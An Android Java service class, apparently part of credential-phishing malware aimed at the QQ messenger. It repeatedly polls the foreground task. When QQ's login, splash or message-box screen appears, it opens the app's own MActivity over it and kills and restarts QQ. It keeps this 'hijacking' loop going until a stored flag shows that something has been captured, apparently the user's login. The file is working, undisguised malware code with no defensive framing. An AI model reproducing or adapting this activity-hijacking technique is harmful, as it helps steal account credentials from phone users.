package com.mycompany.myapp2;

import android.app.ActivityManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.IBinder;
import android.util.Log;
import java.util.List;
import android.os.Message;

public class MService extends Service implements Runnable
	{
        boolean flag=true;
		SharedPreferences p;
		Handler h=new Handler(){

				@Override
				public void handleMessage(Message msg)
					{
					// TODO: Implement this method
					super.handleMessage(msg);
					if(msg.what==0x001){
						
						Intent p=new Intent(getBaseContext(),MActivity.class);
						p.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
						startActivity(p);
						
						stopQQ((String)msg.obj);
						
					}
					}
			
		};
		private boolean isThis(String name){
			return name.equals("com.tencent.mobileqq.activity.LoginActivity")||name.equals("com.tencent.mobileqq.activity.SplashActivity")
				||name.equals("com.tencent.mobileqq.dating.MsgBoxListActivity");
		}

		@Override
		public void run()
			{
			while(!p.getBoolean("get",false)){
				//没有获取到时 持续劫持qq进程
				List<ActivityManager.RunningTaskInfo> l=a.getRunningTasks(1);
				if(l!=null){
					ActivityManager.RunningTaskInfo r=l.get(0);
					if(r!=null){
						//Log.i("k",r.topActivity.getClassName());
						if(isThis(r.topActivity.getClassName())){
						    String x=r.topActivity.getPackageName();
							Message o=new Message();
							o.obj=x;
							o.what=0x001;
							h.sendMessageDelayed(o,50);
						}
					}
				}
				try
					{
					Thread.currentThread().sleep(500);
					}
				catch (InterruptedException e)
					{}
				}
			}

		private void stopQQ(String al)
			{
				Log.i("k",al);
			    a.killBackgroundProcesses(al);
				a.restartPackage(al);
			}

		@Override
		public IBinder onBind(Intent p1)
			{
			// TODO: Implement this method
			return null;
			}
		ActivityManager a;
		@Override
		public void onStart(Intent intent, int startId)
			{
			// TODO: Implement this method
			super.onStart(intent, startId);
             p=this.getSharedPreferences("get", Context.MODE_PRIVATE);

			a=(ActivityManager)getSystemService(Context.ACTIVITY_SERVICE);
			stopQQ("com.tencent.mobileqq");

		    new Thread(this).start();
			//启动监听进程

			}
	
}
